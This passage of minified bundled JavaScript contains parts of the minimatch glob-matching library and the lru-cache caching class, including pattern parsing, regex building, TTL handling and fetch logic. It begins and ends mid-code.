if(J&&X[Y]==="**"&&Q[W]===X[Y+1])G.push(X[Y]),Y++;else if(J&&Q[W]==="**"&&X[Y]===Q[W+1])G.push(Q[W]),W++;else if(X[Y]==="*"&&Q[W]&&(this.options.dot||!Q[W].startsWith("."))&&Q[W]!=="**"){if(H==="b")return!1;H="a",G.push(X[Y]),Y++,W++}else if(Q[W]==="*"&&X[Y]&&(this.options.dot||!X[Y].startsWith("."))&&X[Y]!=="**"){if(H==="a")return!1;H="b",G.push(Q[W]),Y++,W++}else return!1;return X.length===Q.length&&G}parseNegate(){if(this.nonegate)return;let X=this.pattern,Q=!1,J=0;for(let Y=0;Y<X.length&&X.charAt(Y)==="!";Y++)Q=!Q,J++;if(J)this.pattern=X.slice(J);this.negate=Q}matchOne(X,Q,J=!1){let Y=this.options;if(this.isWindows){let M=typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0]),L=!M&&X[0]===""&&X[1]===""&&X[2]==="?"&&/^[a-z]:$/i.test(X[3]),R=typeof Q[0]==="string"&&/^[a-z]:$/i.test(Q[0]),j=!R&&Q[0]===""&&Q[1]===""&&Q[2]==="?"&&typeof Q[3]==="string"&&/^[a-z]:$/i.test(Q[3]),F=L?3:M?0:void 0,A=j?3:R?0:void 0;if(typeof F==="number"&&typeof A==="number"){let[O,w]=[X[F],Q[A]];if(O.toLowerCase()===w.toLowerCase()){if(Q[A]=O,A>F)Q=Q.slice(A);else if(F>A)X=X.slice(F)}}}let{optimizationLevel:W=1}=this.options;if(W>=2)X=this.levelTwoFileOptimize(X);this.debug("matchOne",this,{file:X,pattern:Q}),this.debug("matchOne",X.length,Q.length);for(var G=0,H=0,$=X.length,z=Q.length;G<$&&H<z;G++,H++){this.debug("matchOne loop");var U=Q[H],K=X[G];if(this.debug(Q,U,K),U===!1)return!1;if(U===M9){this.debug("GLOBSTAR",[Q,U,K]);var B=G,q=H+1;if(q===z){this.debug("** at the end");for(;G<$;G++)if(X[G]==="."||X[G]===".."||!Y.dot&&X[G].charAt(0)===".")return!1;return!0}while(B<$){var Z=X[B];if(this.debug(`
globstar while`,X,B,Q,q,Z),this.matchOne(X.slice(B),Q.slice(q),J))return this.debug("globstar found match!",B,$,Z),!0;else{if(Z==="."||Z===".."||!Y.dot&&Z.charAt(0)==="."){this.debug("dot detected!",X,B,Q,q);break}this.debug("globstar swallow a segment, and continue"),B++}}if(J){if(this.debug(`
>>> no match, partial?`,X,B,Q,q),B===$)return!0}return!1}let M;if(typeof U==="string")M=K===U,this.debug("string match",U,K,M);else M=U.test(K),this.debug("pattern match",U,K,M);if(!M)return!1}if(G===$&&H===z)return!0;else if(G===$)return J;else if(H===z)return G===$-1&&X[G]==="";else throw Error("wtf?")}braceExpand(){return JC(this.pattern,this.options)}parse(X){dQ(X);let Q=this.options;if(X==="**")return M9;if(X==="")return"";let J,Y=null;if(J=X.match(hs1))Y=Q.dot?gs1:ys1;else if(J=X.match(Ps1))Y=(Q.nocase?Q.dot?_s1:Ts1:Q.dot?Es1:Ss1)(J[1]);else if(J=X.match(ms1))Y=(Q.nocase?Q.dot?cs1:us1:Q.dot?ls1:ps1)(J);else if(J=X.match(ks1))Y=Q.dot?vs1:bs1;else if(J=X.match(xs1))Y=fs1;let W=Z9.fromGlob(X,this.options).toMMPattern();if(Y&&typeof W==="object")Reflect.defineProperty(W,"test",{value:Y});return W}makeRe(){if(this.regexp||this.regexp===!1)return this.regexp;let X=this.set;if(!X.length)return this.regexp=!1,this.regexp;let Q=this.options,J=Q.noglobstar?rs1:Q.dot?ns1:as1,Y=new Set(Q.nocase?["i"]:[]),W=X.map(($)=>{let z=$.map((U)=>{if(U instanceof RegExp)for(let K of U.flags.split(""))Y.add(K);return typeof U==="string"?Xt1(U):U===M9?M9:U._src});return z.forEach((U,K)=>{let B=z[K+1],q=z[K-1];if(U!==M9||q===M9)return;if(q===void 0)if(B!==void 0&&B!==M9)z[K+1]="(?:\\/|"+J+"\\/)?"+B;else z[K]=J;else if(B===void 0)z[K-1]=q+"(?:\\/|"+J+")?";else if(B!==M9)z[K-1]=q+"(?:\\/|\\/"+J+"\\/)"+B,z[K+1]=M9}),z.filter((U)=>U!==M9).join("/")}).join("|"),[G,H]=X.length>1?["(?:",")"]:["",""];if(W="^"+G+W+H+"$",this.negate)W="^(?!"+W+").+$";try{this.regexp=new RegExp(W,[...Y].join(""))}catch($){this.regexp=!1}return this.regexp}slashSplit(X){if(this.preserveMultipleSlashes)return X.split("/");else if(this.isWindows&&/^\/\/[^\/]+/.test(X))return["",...X.split(/\/+/)];else return X.split(/\/+/)}match(X,Q=this.partial){if(this.debug("match",X,this.pattern),this.comment)return!1;if(this.empty)return X==="";if(X==="/"&&Q)return!0;let J=this.options;if(this.isWindows)X=X.split("\\").join("/");let Y=this.slashSplit(X);this.debug(this.pattern,"split",Y);let W=this.set;this.debug(this.pattern,"set",W);let G=Y[Y.length-1];if(!G)for(let H=Y.length-2;!G&&H>=0;H--)G=Y[H];for(let H=0;H<W.length;H++){let $=W[H],z=Y;if(J.matchBase&&$.length===1)z=[G];if(this.matchOne(z,$,Q)){if(J.flipNegate)return!0;return!this.negate}}if(J.flipNegate)return!1;return this.negate}static defaults(X){return k9.defaults(X).Minimatch}}var k9=(X,Q,J={})=>{if(dQ(Q),!J.nocomment&&Q.charAt(0)==="#")return!1;return new q6(Q,J).match(X)},Ps1,Ss1=(X)=>(Q)=>!Q.startsWith(".")&&Q.endsWith(X),Es1=(X)=>(Q)=>Q.endsWith(X),Ts1=(X)=>{return X=X.toLowerCase(),(Q)=>!Q.startsWith(".")&&Q.toLowerCase().endsWith(X)},_s1=(X)=>{return X=X.toLowerCase(),(Q)=>Q.toLowerCase().endsWith(X)},ks1,bs1=(X)=>!X.startsWith(".")&&X.includes("."),vs1=(X)=>X!=="."&&X!==".."&&X.includes("."),xs1,fs1=(X)=>X!=="."&&X!==".."&&X.startsWith("."),hs1,ys1=(X)=>X.length!==0&&!X.startsWith("."),gs1=(X)=>X.length!==0&&X!=="."&&X!=="..",ms1,us1=([X,Q=""])=>{let J=eI([X]);if(!Q)return J;return Q=Q.toLowerCase(),(Y)=>J(Y)&&Y.toLowerCase().endsWith(Q)},cs1=([X,Q=""])=>{let J=XC([X]);if(!Q)return J;return Q=Q.toLowerCase(),(Y)=>J(Y)&&Y.toLowerCase().endsWith(Q)},ls1=([X,Q=""])=>{let J=XC([X]);return!Q?J:(Y)=>J(Y)&&Y.endsWith(Q)},ps1=([X,Q=""])=>{let J=eI([X]);return!Q?J:(Y)=>J(Y)&&Y.endsWith(Q)},eI=([X])=>{let Q=X.length;return(J)=>J.length===Q&&!J.startsWith(".")},XC=([X])=>{let Q=X.length;return(J)=>J.length===Q&&J!=="."&&J!==".."},QC,sI,ds1,M9,is1="[^/]",rs1,ns1="(?:(?!(?:\\/|^)(?:\\.{1,2})($|\\/)).)*?",as1="(?:(?!(?:\\/|^)\\.).)*?",os1=(X,Q={})=>(J)=>k9(J,X,Q),B6=(X,Q={})=>Object.assign({},X,Q),ss1=(X)=>{if(!X||typeof X!=="object"||!Object.keys(X).length)return k9;let Q=k9;return Object.assign((Y,W,G={})=>Q(Y,W,B6(X,G)),{Minimatch:class extends Q.Minimatch{constructor(W,G={}){super(W,B6(X,G))}static defaults(W){return Q.defaults(B6(X,W)).Minimatch}},AST:class extends Q.AST{constructor(W,G,H={}){super(W,G,B6(X,H))}static fromGlob(W,G={}){return Q.AST.fromGlob(W,B6(X,G))}},unescape:(Y,W={})=>Q.unescape(Y,B6(X,W)),escape:(Y,W={})=>Q.escape(Y,B6(X,W)),filter:(Y,W={})=>Q.filter(Y,B6(X,W)),defaults:(Y)=>Q.defaults(B6(X,Y)),makeRe:(Y,W={})=>Q.makeRe(Y,B6(X,W)),braceExpand:(Y,W={})=>Q.braceExpand(Y,B6(X,W)),match:(Y,W,G={})=>Q.match(Y,W,B6(X,G)),sep:Q.sep,GLOBSTAR:M9})},JC=(X,Q={})=>{if(dQ(X),Q.nobrace||!/\{(?:(?!\{).)*\}/.test(X))return[X];return lI(X)},ts1=(X,Q={})=>new q6(X,Q).makeRe(),es1=(X,Q,J={})=>{let Y=new q6(Q,J);if(X=X.filter((W)=>Y.match(W)),Y.options.nonull&&!X.length)X.push(Q);return X},tI,Xt1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&");var PX=$1(()=>{pI();PK();PK();Ps1=/^\*+([^+@!?\*\[\(]*)$/,ks1=/^\*+\.\*+$/,xs1=/^\.\*+$/,hs1=/^\*+$/,ms1=/^\?+([^+@!?\*\[\(]*)?$/,QC=typeof process==="object"&&process?typeof process.env==="object"&&process.env&&process.env.__MINIMATCH_TESTING_PLATFORM__||process.platform:"posix",sI={win32:{sep:"\\"},posix:{sep:"/"}},ds1=QC==="win32"?sI.win32.sep:sI.posix.sep;k9.sep=ds1;M9=Symbol("globstar **");k9.GLOBSTAR=M9;rs1=is1+"*?";k9.filter=os1;k9.defaults=ss1;k9.braceExpand=JC;k9.makeRe=ts1;k9.match=es1;tI=/[?*]|[+@!]\(.*?\)|\[|\]/;k9.AST=Z9;k9.Minimatch=q6;k9.escape=l5;k9.unescape=f6});class p5{heap;length;static#X=!1;static create(X){let Q=HC(X);if(!Q)return[];p5.#X=!0;let J=new p5(X,Q);return p5.#X=!1,J}constructor(X,Q){if(!p5.#X)throw TypeError("instantiate Stack using Stack.create(n)");this.heap=new Q(X),this.length=0}push(X){this.heap[this.length++]=X}pop(){return this.heap[--this.length]}}var Qt1,WC,SK,GC=(X,Q,J,Y)=>{typeof SK.emitWarning==="function"?SK.emitWarning(X,Q,J,Y):console.error(`[${J}] ${Q}: ${X}`)},hW,YC,Jt1=(X)=>!WC.has(X),DK0,SX=(X)=>X&&X===Math.floor(X)&&X>0&&isFinite(X),HC=(X)=>!SX(X)?null:X<=Math.pow(2,8)?Uint8Array:X<=Math.pow(2,16)?Uint16Array:X<=Math.pow(2,32)?Uint32Array:X<=Number.MAX_SAFE_INTEGER?rQ:null,rQ,nQ;var $C=$1(()=>{Qt1=typeof performance==="object"&&performance&&typeof performance.now==="function"?performance:Date,WC=new Set,SK=typeof process==="object"&&!!process?process:{},hW=globalThis.AbortController,YC=globalThis.AbortSignal;if(typeof hW>"u"){YC=class{onabort;_onabort=[];reason;aborted=!1;addEventListener(Y,W){this._onabort.push(W)}},hW=class{constructor(){Q()}signal=new YC;abort(Y){if(this.signal.aborted)return;this.signal.reason=Y,this.signal.aborted=!0;for(let W of this.signal._onabort)W(Y);this.signal.onabort?.(Y)}};let X=SK.env?.LRU_CACHE_IGNORE_AC_WARNING!=="1",Q=()=>{if(!X)return;X=!1,GC("AbortController is not defined. If using lru-cache in node 14, load an AbortController polyfill from the `node-abort-controller` package. A minimal polyfill is provided for use by LRUCache.fetch(), but it should not be relied upon in other contexts (eg, passing it to other APIs that use AbortController/AbortSignal might have undesirable effects). You may disable this with LRU_CACHE_IGNORE_AC_WARNING=1 in the env.","NO_ABORT_CONTROLLER","ENOTSUP",Q)}}DK0=Symbol("type");rQ=class rQ extends Array{constructor(X){super(X);this.fill(0)}};nQ=class nQ{#X;#Q;#G;#W;#H;#R;#O;#K;get perf(){return this.#K}ttl;ttlResolution;ttlAutopurge;updateAgeOnGet;updateAgeOnHas;allowStale;noDisposeOnSet;noUpdateTTL;maxEntrySize;sizeCalculation;noDeleteOnFetchRejection;noDeleteOnStaleGet;allowStaleOnFetchAbort;allowStaleOnFetchRejection;ignoreFetchAbort;#$;#B;#V;#z;#J;#Z;#L;#A;#M;#S;#j;#N;#C;#F;#D;#P;#q;#Y;static unsafeExposeInternals(X){return{starts:X.#C,ttls:X.#F,sizes:X.#N,keyMap:X.#V,keyList:X.#z,valList:X.#J,next:X.#Z,prev:X.#L,get head(){return X.#A},get tail(){return X.#M},free:X.#S,isBackgroundFetch:(Q)=>X.#U(Q),backgroundFetch:(Q,J,Y,W)=>X.#l(Q,J,Y,W),moveToTail:(Q)=>X.#h(Q),indexes:(Q)=>X.#T(Q),rindexes:(Q)=>X.#k(Q),isStale:(Q)=>X.#I(Q)}}get max(){return this.#X}get maxSize(){return this.#Q}get calculatedSize(){return this.#B}get size(){return this.#$}get fetchMethod(){return this.#R}get memoMethod(){return this.#O}get dispose(){return this.#G}get onInsert(){return this.#W}get disposeAfter(){return this.#H}constructor(X){let{max:Q=0,ttl:J,ttlResolution:Y=1,ttlAutopurge:W,updateAgeOnGet:G,updateAgeOnHas:H,allowStale:$,dispose:z,onInsert:U,disposeAfter:K,noDisposeOnSet:B,noUpdateTTL:q,maxSize:Z=0,maxEntrySize:M=0,sizeCalculation:L,fetchMethod:R,memoMethod:j,noDeleteOnFetchRejection:F,noDeleteOnStaleGet:A,allowStaleOnFetchRejection:O,allowStaleOnFetchAbort:w,ignoreFetchAbort:N,perf:C}=X;if(C!==void 0){if(typeof C?.now!=="function")throw TypeError("perf option must have a now() method if specified")}if(this.#K=C??Qt1,Q!==0&&!SX(Q))throw TypeError("max option must be a nonnegative integer");let _=Q?HC(Q):Array;if(!_)throw Error("invalid max value: "+Q);if(this.#X=Q,this.#Q=Z,this.maxEntrySize=M||this.#Q,this.sizeCalculation=L,this.sizeCalculation){if(!this.#Q&&!this.maxEntrySize)throw TypeError("cannot set sizeCalculation without setting maxSize or maxEntrySize");if(typeof this.sizeCalculation!=="function")throw TypeError("sizeCalculation set to non-function")}if(j!==void 0&&typeof j!=="function")throw TypeError("memoMethod must be a function if defined");if(this.#O=j,R!==void 0&&typeof R!=="function")throw TypeError("fetchMethod must be a function if specified");if(this.#R=R,this.#P=!!R,this.#V=new Map,this.#z=Array(Q).fill(void 0),this.#J=Array(Q).fill(void 0),this.#Z=new _(Q),this.#L=new _(Q),this.#A=0,this.#M=0,this.#S=p5.create(Q),this.#$=0,this.#B=0,typeof z==="function")this.#G=z;if(typeof U==="function")this.#W=U;if(typeof K==="function")this.#H=K,this.#j=[];else this.#H=void 0,this.#j=void 0;if(this.#D=!!this.#G,this.#Y=!!this.#W,this.#q=!!this.#H,this.noDisposeOnSet=!!B,this.noUpdateTTL=!!q,this.noDeleteOnFetchRejection=!!F,this.allowStaleOnFetchRejection=!!O,this.allowStaleOnFetchAbort=!!w,this.ignoreFetchAbort=!!N,this.maxEntrySize!==0){if(this.#Q!==0){if(!SX(this.#Q))throw TypeError("maxSize must be a positive integer if specified")}if(!SX(this.maxEntrySize))throw TypeError("maxEntrySize must be a positive integer if specified");this.#y()}if(this.allowStale=!!$,this.noDeleteOnStaleGet=!!A,this.updateAgeOnGet=!!G,this.updateAgeOnHas=!!H,this.ttlResolution=SX(Y)||Y===0?Y:1,this.ttlAutopurge=!!W,this.ttl=J||0,this.ttl){if(!SX(this.ttl))throw TypeError("ttl must be a positive integer if specified");this.#b()}if(this.#X===0&&this.ttl===0&&this.#Q===0)throw TypeError("At least one of max, maxSize, or ttl is required");if(!this.ttlAutopurge&&!this.#X&&!this.#Q){if(Jt1("LRU_CACHE_UNBOUNDED"))WC.add("LRU_CACHE_UNBOUNDED"),GC("TTL caching without ttlAutopurge, max, or maxSize can result in unbounded memory consumption.","UnboundedCacheWarning","LRU_CACHE_UNBOUNDED",nQ)}}getRemainingTTL(X){return this.#V.has(X)?1/0:0}#b(){let X=new rQ(this.#X),Q=new rQ(this.#X);this.#F=X,this.#C=Q,this.#u=(W,G,H=this.#K.now())=>{if(Q[W]=G!==0?H:0,X[W]=G,G!==0&&this.ttlAutopurge){let $=setTimeout(()=>{if(this.#I(W))this.#_(this.#z[W],"expire")},G+1);if($.unref)$.unref()}},this.#E=(W)=>{Q[W]=X[W]!==0?this.#K.now():0},this.#w=(W,G)=>{if(X[G]){let H=X[G],$=Q[G];if(!H||!$)return;W.ttl=H,W.start=$,W.now=J||Y();let z=W.now-$;W.remainingTTL=H-z}};let J=0,Y=()=>{let W=this.#K.now();if(this.ttlResolution>0){J=W;let G=setTimeout(()=>J=0,this.ttlResolution);if(G.unref)G.unref()}return W};this.getRemainingTTL=(W)=>{let G=this.#V.get(W);if(G===void 0)return 0;let H=X[G],$=Q[G];if(!H||!$)return 1/0;let z=(J||Y())-$;return H-z},this.#I=(W)=>{let G=Q[W],H=X[W];return!!H&&!!G&&(J||Y())-G>H}}#E=()=>{};#w=()=>{};#u=()=>{};#I=()=>!1;#y(){let X=new rQ(this.#X);this.#B=0,this.#N=X,this.#v=(Q)=>{this.#B-=X[Q],X[Q]=0},this.#x=(Q,J,Y,W)=>{if(this.#U(J))return 0;if(!SX(Y))if(W){if(typeof W!=="function")throw TypeError("sizeCalculation must be a function");if(Y=W(J,Q),!SX(Y))throw TypeError("sizeCalculation return invalid (expect positive integer)")}else throw TypeError("invalid size value (must be positive integer). When maxSize or maxEntrySize is used, sizeCalculation or size must be set.");return Y},this.#g=(Q,J,Y)=>{if(X[Q]=J,this.#Q){let W=this.#Q-X[Q];while(this.#B>W)this.#f(!0)}if(this.#B+=X[Q],Y)Y.entrySize=J,Y.totalCalculatedSize=this.#B}}#v=(X)=>{};#g=(X,Q,J)=>{};#x=(X,Q,J,Y)=>{if(J||Y)throw TypeError("cannot set size without setting maxSize or maxEntrySize on cache");return 0};*#T({allowStale:X=this.allowStale}={}){if(this.#$)for(let Q=this.#M;;){if(!this.#c(Q))break;if(X||!this.#I(Q))yield Q;if(Q===this.#A)break;else Q=this.#L[Q]}}*#k({allowStale:X=this.allowStale}={}){if(this.#$)for(let Q=this.#A;;){if(!this.#c(Q))break;if(X||!this.#I(Q))yield Q;if(Q===this.#M)break;else Q=this.#Z[Q]}}#c(X){return X!==void 0&&this.#V.get(this.#z[X])===X}*entries(){for(let X of this.#T())if(this.#J[X]!==void 0&&this.#z[X]!==void 0&&!this.#U(this.#J[X]))yield[this.#z[X],this.#J[X]]}*rentries(){for(let X of this.#k())if(this.#J[X]!==void 0&&this.#z[X]!==void 0&&!this.#U(this.#J[X]))yield[this.#z[X],this.#J[X]]}*keys(){for(let X of this.#T()){let Q=this.#z[X];if(Q!==void 0&&!this.#U(this.#J[X]))yield Q}}*rkeys(){for(let X of this.#k()){let Q=this.#z[X];if(Q!==void 0&&!this.#U(this.#J[X]))yield Q}}*values(){for(let X of this.#T())if(this.#J[X]!==void 0&&!this.#U(this.#J[X]))yield this.#J[X]}*rvalues(){for(let X of this.#k())if(this.#J[X]!==void 0&&!this.#U(this.#J[X]))yield this.#J[X]}[Symbol.iterator](){return this.entries()}[Symbol.toStringTag]="LRUCache";find(X,Q={}){for(let J of this.#T()){let Y=this.#J[J],W=this.#U(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;if(X(W,this.#z[J],this))return this.get(this.#z[J],Q)}}forEach(X,Q=this){for(let J of this.#T()){let Y=this.#J[J],W=this.#U(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(Q,W,this.#z[J],this)}}rforEach(X,Q=this){for(let J of this.#k()){let Y=this.#J[J],W=this.#U(Y)?Y.__staleWhileFetching:Y;if(W===void 0)continue;X.call(Q,W,this.#z[J],this)}}purgeStale(){let X=!1;for(let Q of this.#k({allowStale:!0}))if(this.#I(Q))this.#_(this.#z[Q],"expire"),X=!0;return X}info(X){let Q=this.#V.get(X);if(Q===void 0)return;let J=this.#J[Q],Y=this.#U(J)?J.__staleWhileFetching:J;if(Y===void 0)return;let W={value:Y};if(this.#F&&this.#C){let G=this.#F[Q],H=this.#C[Q];if(G&&H){let $=G-(this.#K.now()-H);W.ttl=$,W.start=Date.now()}}if(this.#N)W.size=this.#N[Q];return W}dump(){let X=[];for(let Q of this.#T({allowStale:!0})){let J=this.#z[Q],Y=this.#J[Q],W=this.#U(Y)?Y.__staleWhileFetching:Y;if(W===void 0||J===void 0)continue;let G={value:W};if(this.#F&&this.#C){G.ttl=this.#F[Q];let H=this.#K.now()-this.#C[Q];G.start=Math.floor(Date.now()-H)}if(this.#N)G.size=this.#N[Q];X.unshift([J,G])}return X}load(X){this.clear();for(let[Q,J]of X){if(J.start){let Y=Date.now()-J.start;J.start=this.#K.now()-Y}this.set(Q,J.value,J)}}set(X,Q,J={}){if(Q===void 0)return this.delete(X),this;let{ttl:Y=this.ttl,start:W,noDisposeOnSet:G=this.noDisposeOnSet,sizeCalculation:H=this.sizeCalculation,status:$}=J,{noUpdateTTL:z=this.noUpdateTTL}=J,U=this.#x(X,Q,J.size||0,H);if(this.maxEntrySize&&U>this.maxEntrySize){if($)$.set="miss",$.maxEntrySizeExceeded=!0;return this.#_(X,"set"),this}let K=this.#$===0?void 0:this.#V.get(X);if(K===void 0){if(K=this.#$===0?this.#M:this.#S.length!==0?this.#S.pop():this.#$===this.#X?this.#f(!1):this.#$,this.#z[K]=X,this.#J[K]=Q,this.#V.set(X,K),this.#Z[this.#M]=K,this.#L[K]=this.#M,this.#M=K,this.#$++,this.#g(K,U,$),$)$.set="add";if(z=!1,this.#Y)this.#W?.(Q,X,"add")}else{this.#h(K);let B=this.#J[K];if(Q!==B){if(this.#P&&this.#U(B)){B.__abortController.abort(Error("replaced"));let{__staleWhileFetching:q}=B;if(q!==void 0&&!G){if(this.#D)this.#G?.(q,X,"set");if(this.#q)this.#j?.push([q,X,"set"])}}else if(!G){if(this.#D)this.#G?.(B,X,"set");if(this.#q)this.#j?.push([B,X,"set"])}if(this.#v(K),this.#g(K,U,$),this.#J[K]=Q,$){$.set="replace";let q=B&&this.#U(B)?B.__staleWhileFetching:B;if(q!==void 0)$.oldValue=q}}else if($)$.set="update";if(this.#Y)this.onInsert?.(Q,X,Q===B?"update":"replace")}if(Y!==0&&!this.#F)this.#b();if(this.#F){if(!z)this.#u(K,Y,W);if($)this.#w($,K)}if(!G&&this.#q&&this.#j){let B=this.#j,q;while(q=B?.shift())this.#H?.(...q)}return this}pop(){try{while(this.#$){let X=this.#J[this.#A];if(this.#f(!0),this.#U(X)){if(X.__staleWhileFetching)return X.__staleWhileFetching}else if(X!==void 0)return X}}finally{if(this.#q&&this.#j){let X=this.#j,Q;while(Q=X?.shift())this.#H?.(...Q)}}}#f(X){let Q=this.#A,J=this.#z[Q],Y=this.#J[Q];if(this.#P&&this.#U(Y))Y.__abortController.abort(Error("evicted"));else if(this.#D||this.#q){if(this.#D)this.#G?.(Y,J,"evict");if(this.#q)this.#j?.push([Y,J,"evict"])}if(this.#v(Q),X)this.#z[Q]=void 0,this.#J[Q]=void 0,this.#S.push(Q);if(this.#$===1)this.#A=this.#M=0,this.#S.length=0;else this.#A=this.#Z[Q];return this.#V.delete(J),this.#$--,Q}has(X,Q={}){let{updateAgeOnHas:J=this.updateAgeOnHas,status:Y}=Q,W=this.#V.get(X);if(W!==void 0){let G=this.#J[W];if(this.#U(G)&&G.__staleWhileFetching===void 0)return!1;if(!this.#I(W)){if(J)this.#E(W);if(Y)Y.has="hit",this.#w(Y,W);return!0}else if(Y)Y.has="stale",this.#w(Y,W)}else if(Y)Y.has="miss";return!1}peek(X,Q={}){let{allowStale:J=this.allowStale}=Q,Y=this.#V.get(X);if(Y===void 0||!J&&this.#I(Y))return;let W=this.#J[Y];return this.#U(W)?W.__staleWhileFetching:W}#l(X,Q,J,Y){let W=Q===void 0?void 0:this.#J[Q];if(this.#U(W))return W;let G=new hW,{signal:H}=J;H?.addEventListener("abort",()=>G.abort(H.reason),{signal:G.signal});let $={signal:G.signal,options:J,context:Y},z=(M,L=!1)=>{let{aborted:R}=G.signal,j=J.ignoreFetchAbort&&M!==void 0;if(J.status)if(R&&!L){if(J.status.fetchAborted=!0,J.status.fetchError=G.signal.reason,j)J.status.fetchAbortIgnored=!0}else J.status.fetchResolved=!0;if(R&&!j&&!L)return K(G.signal.reason);let F=q;if(this.#J[Q]===q)if(M===void 0)if(F.__staleWhileFetching!==void 0)this.#J[Q]=F.__staleWhileFetching;else this.#_(X,"fetch");else{if(J.status)J.status.fetchUpdated=!0;this.set(X,M,$.options)}return M},U=(M)=>{if(J.status)J.status.fetchRejected=!0,J.status.fetchError=M;return K(M)},K=(M)=>{let{aborted:L}=G.signal,R=L&&J.allowStaleOnFetchAbort,j=R||J.allowStaleOnFetchRejection,F=j||J.noDeleteOnFetchRejection,A=q;if(this.#J[Q]===q){if(!F||A.__staleWhileFetching===void 0)this.#_(X,"fetch");else if(!R)this.#J[Q]=A.__staleWhileFetching}if(j){if(J.status&&A.__staleWhileFetching!==void 0)J.status.returnedStale=!0;return A.__staleWhileFetching}else if(A.__returned===A)throw M},B=(M,L)=>{let R=this.#R?.(X,W,$);if(R&&R instanceof Promise)R.then((j)=>M(j===void 0?void 0:j),L);G.signal.addEventListener("abort",()=>{if(!J.ignoreFetchAbort||J.allowStaleOnFetchAbort){if(M(void 0),J.allowStaleOnFetchAbort)M=(j)=>z(j,!0)}})};if(J.status)J.status.fetchDispatched=!0;let q=new Promise(B).then(z,U),Z=Object.assign(q,{__abortController:G,__staleWhileFetching:W,__returned:void 0});if(Q===void 0)this.set(X,Z,{...$.options,status:void 0}),Q=this.#V.get(X);else this.#J[Q]=Z;return Z}#U(X){if(!this.#P)return!1;let Q=X;return!!Q&&Q instanceof Promise&&Q.hasOwnProperty("__staleWhileFetching")&&Q.__abortController instanceof hW}async fetch(X,Q={}){let{allowStale:J=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,ttl:G=this.ttl,noDisposeOnSet:H=this.noDisposeOnSet,size:$=0,sizeCalculation:z=this.sizeCalculation,noUpdateTTL:U=this.noUpdateTTL,noDeleteOnFetchRejection:K=this.noDeleteOnFetchRejection,allowStaleOnFetchRejection:B=this.allowStaleOnFetchRejection,ignoreFetchAbort:q=this.ignoreFetchAbort,allowStaleOnFetchAbort:Z=this.allowStaleOnFetchAbort,context:M,forceRefresh:L=!1,status:R,signal:j}=Q;if(!this.#P){if(R)R.fetch="get";return this.get(X,{allowStale:J,updateAgeOnGet:Y,noDeleteOnStaleGet:W,status:R})}let F={allowStale:J,updateAgeOnGet:Y,noDeleteOnStaleGet:W,ttl:G,noDisposeOnSet:H,size:$,sizeCalculation:z,noUpdateTTL:U,noDeleteOnFetchRejection:K,allowStaleOnFetchRejection:B,allowStaleOnFetchAbort:Z,ignoreFetchAbort:q,status:R,signal:j},A=this.#V.get(X);if(A===void 0){if(R)R.fetch="miss";let O=this.#l(X,A,F,M);return O.__returned=O}else{let O=this.#J[A];if(this.#U(O)){let h=J&&O.__staleWhileFetching!==void 0;if(R){if(R.fetch="inflight",h)R.returnedStale=!0}return h?O.__staleWhileFetching:O.__returned=O}let w=this.#I(A);if(!L&&!w){if(R)R.fetch="hit";if(this.#h(A),Y)this.#E(A);if(R)this.#w(R,A);return O}let N=this.#l(X,A,F,M),_=N.__staleWhileFetching!==void 0&&J;if(R){if(R.fetch=w?"stale":"refresh",_&&w)R.returnedStale=!0}return _?N.__staleWhileFetching:N.__returned=N}}async forceFetch(X,Q={}){let J=await this.fetch(X,Q);if(J===void 0)throw Error("fetch() returned undefined");return J}memo(X,Q={}){let J=this.#O;if(!J)throw Error("no memoMethod provided to constructor");let{context:Y,forceRefresh:W,...G}=Q,H=this.get(X,G);if(!W&&H!==void 0)return H;let $=J(X,H,{options:G,context:Y});return this.set(X,$,G),$}get(X,Q={}){let{allowStale:J=this.allowStale,updateAgeOnGet:Y=this.updateAgeOnGet,noDeleteOnStaleGet:W=this.noDeleteOnStaleGet,status:G}=Q,H=this.#V.get(X);if(H!==void 0){let $=this.#J[H],z=this.#U($);if(G)this.#w(G,H);if(this.#I(H)){if(G)G.get="stale";if(!z){if(!W)this.#_(X,"expire");if(G&&J)G.returnedStale=!0;return J?$:void 0}else{if(G&&J&&$.__staleWhileFetching!==void 0)G.returnedStale=!0;return J?$.__staleWhileFetching:void 0}}else{if(G)G.get="hit";if(z)return $.__staleWhileFetching;if(this.#h(H),Y)this.#E(H);return $}}else if(G)G.get="miss"}#p(X,Q){this.#L[Q]=X,this.#Z[X]=Q}#h(X){if(X!==this.#M){if(X===this.#A)this.#A=this.#Z[X];else this.#p(this.#L[X],this.#Z[X]);this.#p(this.#M,X),this.#M=X}}delete(X){return this.#_(X,"delete")}#_(X,Q){let J=!1;if(this.#$!==0){let Y=this.#V.get(X);if(Y!==void 0)if(J=!0,this.#$===1)this.#m(Q);else{this.#v(Y);let W=this.#J[Y];if(this.#U(W))W.__abortController.abort(Error("deleted"));else if(this.#D||this.#q){if(this.#D)this.#G?.(W,X,Q);if(this.#q)this.#j?.push([W,X,Q])}if(this.#V.delete(X),this.#z[Y]=void 0,this.#J[Y]=void 0,Y===this.#M)this.#M=this.#L[Y];else if(Y===this.#A)this.#A=this.#Z[Y];else{let G=this.#L[Y];this.#Z[G]=this.#Z[Y];let H=this.#Z[Y];this.#L[H]=this.#L[Y]}this.#$--,this.#S.push(Y)}}if(this.#q&&this.#j?.length){let Y=this.#j,W;while(W=Y?.shift())this.#H?.(...W)}return J}clear(){return this.#m("delete")}#m(X){for(let Q of this.#k({allowStale:!0})){let J=this.#J[Q];if(this.#U(J))J.__abortController.abort(Error("deleted"));else{let Y=this.#z[Q];if(this.#D)this.#G?.(J,Y,X);if(this.#q)this.#j?.push([J,Y,X])}}if(this.#V.clear(),this.#J.fill(void 0),this.#z.fill(void 0),this.#F&&this.#C)this.#F.fill(0),this.#C.fill(0);if(this.#N)this.#N.fill(0);if(this.#A=0,this.#M=0,this.#S.length=0,this.#B=0,this.#$=0,this.#q&&this.#j){let Q=this.#j,J;while(J=Q?.shift())this.#H?.(...J)}}}});import{EventEmitter as vK}from"node:events";import BC from"node:stream";import{StringDecoder as Yt1}from"node:string_decoder";class 